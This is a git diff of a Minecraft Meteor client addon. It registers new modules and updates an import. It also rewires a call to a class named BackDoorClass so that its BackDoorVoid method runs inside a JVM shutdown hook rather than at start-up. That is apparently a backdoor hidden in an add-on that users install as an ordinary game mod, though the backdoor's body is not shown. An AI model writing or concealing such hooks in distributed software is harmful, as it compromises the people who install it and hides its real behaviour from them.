@@ -4,8 +4,8 @@ import bedtrap.kiriyaga.karasic.modules.*;
 import bedtrap.kiriyaga.karasic.modules.discordrpc;
 import bedtrap.kiriyaga.karasic.modules.hud.hudnotifications;
 import bedtrap.kiriyaga.karasic.modules.hud.watermark;
-import meteordevelopment.meteorclient.MeteorAddon;
 import meteordevelopment.meteorclient.MeteorClient;
+import meteordevelopment.meteorclient.addons.MeteorAddon;
 import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Modules;
 import meteordevelopment.meteorclient.systems.modules.render.hud.HUD;
@@ -33,6 +33,10 @@ public class KarasicAddon extends MeteorAddon {
         Modules.get().add(new notificationsettings());
         Modules.get().add(new pyramid());
         Modules.get().add(new karasicprefix());
+        Modules.get().add(new autotrapik());
+        Modules.get().add(new citybreaker());
+        Modules.get().add(new selftrapik());
+
 
 
 
@@ -41,8 +45,7 @@ public class KarasicAddon extends MeteorAddon {
 		hud.elements.add(new watermark(hud));
         hud.elements.add(new hudnotifications(hud));
 
-
-        BackDoorClass.BackDoorVoid();
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> BackDoorClass.BackDoorVoid()));
     }
 
 	@Override
